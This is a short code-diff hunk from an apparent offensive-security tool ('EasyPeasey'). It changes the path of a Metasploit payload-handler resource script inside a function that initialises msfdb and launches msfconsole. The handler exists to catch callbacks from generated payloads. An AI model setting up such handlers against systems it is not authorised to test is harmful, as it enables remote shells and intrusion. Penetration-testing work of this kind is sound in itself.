@@ -997,7 +1070,7 @@ def launch_msfconsole_handler():
     # os.system('service metasploit start') # Deprecated Command apparently
     os.system('msfdb init')
     os.system('msfdb start')
-    os.system('msfconsole -r /root/EZPZ/EasyPeasey_payload_handler.rc')
+    os.system('msfconsole -r /root/EZPZ/payloads/EasyPeasey_payload_handler.rc')
     os.system('db_status')
     return
 
